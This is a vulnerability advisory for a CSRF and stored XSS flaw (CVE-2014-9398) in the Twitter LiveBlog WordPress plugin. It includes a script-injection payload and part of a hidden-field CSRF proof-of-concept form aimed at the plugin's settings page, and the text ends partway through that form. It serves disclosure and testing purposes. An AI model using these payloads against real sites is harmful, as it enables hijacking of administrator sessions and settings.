# Title: CSRF / Stored XSS Vulnerability in Twitter LiveBlog Wordpress Plugin 
# Author: Manideep K	
# CVE-ID: CVE-2014-9398 
# Plugin Homepage: https://wordpress.org/plugins/twitter-liveblog/
# Version Affected: 1.1.2 (probably lower versions)
# Severity: High 

# Description: 
# Vulnerable Parameter:  mashtlb_twitter_username etc
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 
# Vulnerability Class:   	
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

Steps to Reproduce: (POC):
After installing the plugin

Stored XSS: 
1.	Goto settings -> Twitter LiveBlog
2.	Enter this payload – “ "><script>alert(32)</script> “ in any/all of the text fields. 
3.	Save changes and see XSS in action
4.	Visit settings page of this plugin anytime later and you can see the script executing as it is stored. 

Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below

<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=twitter-liveblog.php" method="POST">
      <input type="hidden" name="mashtlb&#95;twitter&#95;username" value="csrf baby" />
      <input type="hidden" name="mashtlb&#95;twitter&#95;password" value="hi" />
      <input type="hidden" name="mashtlb&#95;blog&#95;post&#95;category" value="1" />
      <input type="hidden" name="mashtlb&#95;blog&#95;post&#95;tags" value="be" />
      <input type="hidden" name="mashtlb&#95;blog&#95;post&#95;author" value="1" />
      <input type="hidden" name="mashtlb&#95;twitter&#95;interval" value="10" />
      <input type="hidden" name="mashtlb&#95;twitter&#95;liveblog&#95;interval" value="2" />
